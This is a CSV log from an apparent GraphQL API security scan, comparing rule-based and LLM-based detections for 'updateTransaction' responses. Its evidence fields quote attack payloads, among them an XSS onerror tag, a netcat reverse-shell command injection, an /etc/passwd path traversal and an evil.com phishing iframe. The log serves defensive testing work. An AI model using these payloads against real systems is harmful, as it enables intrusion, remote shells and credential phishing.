timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-07T06:29:44.830861,updateTransaction_response_2,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:29:51.636166,updateTransaction_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response includes unsanitized user-controlled HTML content (`<img src=x onerror=alert(document.domain)>`) in the `description` field. This payload demonstrates a classic stored XSS vector via an `<img>` tag's `onerror` handler. If this value is rendered directly in a browser without proper HTML escaping/sanitization, it will execute arbitrary JavaScript (alerting `document.domain`), confirming script injection capability."", ""evidence"": ""\""description\"": \""<img src=x onerror=alert(document.domain)>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""\""description\"": \""<img src=x onerror=alert(document.domain)>\"""", ""explanation"": ""The response includes unsanitized user-controlled HTML content (`<img src=x onerror=alert(document.domain)>`) in the `description` field. This payload demonstrates a classic stored XSS vector via an `<img>` tag's `onerror` handler. If this value is rendered directly in a browser without proper HTML escaping/sanitization, it will execute arbitrary JavaScript (alerting `document.domain`), confirming script injection capability.""}}]"
2025-10-07T06:30:11.475880,updateTransaction_response_4,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:30:25.129082,updateTransaction_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload contains a netcat command (nc 127.0.0.1 4444 -e /bin/sh) encapsulated in single quotes and semicolons, indicative of a classic reverse shell attempt. This suggests user input is being executed as a system command without proper sanitization. While confirmation requires backend implementation details, the payload structure matches known command injection patterns."", ""evidence"": ""description: \""valid'; nc 127.0.0.1 4444 -e /bin/sh; '\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""description: \""valid'; nc 127.0.0.1 4444 -e /bin/sh; '\"""", ""explanation"": ""The payload contains a netcat command (nc 127.0.0.1 4444 -e /bin/sh) encapsulated in single quotes and semicolons, indicative of a classic reverse shell attempt. This suggests user input is being executed as a system command without proper sanitization. While confirmation requires backend implementation details, the payload structure matches known command injection patterns.""}}]"
2025-10-07T06:30:40.056615,updateTransaction_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response shows a successful mutation ('updateTransaction') where the 'description' field contains a directory traversal payload ('../../../../etc/passwd'). This indicates the application accepted unsanitized user input that could be used to manipulate file paths. While the response doesn't show direct file access, the presence of this payload in a GraphQL mutation suggests potential path traversal vulnerability if this input is used in file system operations."", ""evidence"": ""description field contains '../../../../etc/passwd'"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""HIGH"", ""confidence"": 0.85, ""evidence"": ""description field contains '../../../../etc/passwd'"", ""explanation"": ""The response shows a successful mutation ('updateTransaction') where the 'description' field contains a directory traversal payload ('../../../../etc/passwd'). This indicates the application accepted unsanitized user input that could be used to manipulate file paths. While the response doesn't show direct file access, the presence of this payload in a GraphQL mutation suggests potential path traversal vulnerability if this input is used in file system operations.""}}]"
2025-10-07T06:31:03.915845,updateTransaction_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unescaped HTML content (<iframe>) in the description field, which indicates a potential stored HTML injection vulnerability. If this value is rendered without proper output encoding in client applications, it could enable phishing attacks via malicious iframe embedding. While this requires client-side exploitation, the API's role in persisting unsanitized markup meets HTML injection criteria."", ""evidence"": ""'<iframe src='https://evil.com/login'>' in description field"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""'<iframe src='https://evil.com/login'>' in description field"", ""explanation"": ""The response contains unescaped HTML content (<iframe>) in the description field, which indicates a potential stored HTML injection vulnerability. If this value is rendered without proper output encoding in client applications, it could enable phishing attacks via malicious iframe embedding. While this requires client-side exploitation, the API's role in persisting unsanitized markup meets HTML injection criteria.""}}]"
2025-10-07T06:31:17.853393,updateTransaction_response_8,,1,0,0.0,simple_only,,Access Control,,1,0,0,0,0,0,0.0,no_potential,,,,"[{""detection_name"": ""Query Deny Bypass"", ""detection"": ""vulnerable"", ""category"": ""Access Control"", ""description"": ""Query deny bypass vulnerability confirmed - non-aliased query blocked but aliased query succeeded without errors"", ""evidence"": ""Non-aliased: 400, Aliased: 200, Aliased clean success: True""}]",[]
2025-10-07T06:31:34.303309,updateTransaction_response_9,,1,0,0.0,simple_only,,Access Control,,1,0,0,0,0,0,0.0,no_potential,,,,"[{""detection_name"": ""Query Deny Bypass"", ""detection"": ""vulnerable"", ""category"": ""Access Control"", ""description"": ""Query deny bypass vulnerability confirmed - non-aliased query blocked but aliased query succeeded without errors"", ""evidence"": ""Non-aliased: 400, Aliased: 200, Aliased clean success: True""}]",[]
2025-10-07T06:32:10.011205,updateTransaction_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:32:16.785620,updateTransaction_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The GraphQL response exposes field suggestions in error messages (e.g., 'Did you mean \""amount\""?'), which discloses valid schema field names. This information leakage helps attackers guess valid fields and probe the schema, increasing the risk of unauthorized data access or further attacks. While not directly exploitable, it violates the principle of least information and aids reconnaissance."", ""evidence"": ""Error messages containing 'Did you mean \""amount\""?' and 'Did you mean \""description\""?'"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""Error messages containing 'Did you mean \""amount\""?' and 'Did you mean \""description\""?'"", ""explanation"": ""The GraphQL response exposes field suggestions in error messages (e.g., 'Did you mean \""amount\""?'), which discloses valid schema field names. This information leakage helps attackers guess valid fields and probe the schema, increasing the risk of unauthorized data access or further attacks. While not directly exploitable, it violates the principle of least information and aids reconnaissance.""}}]"
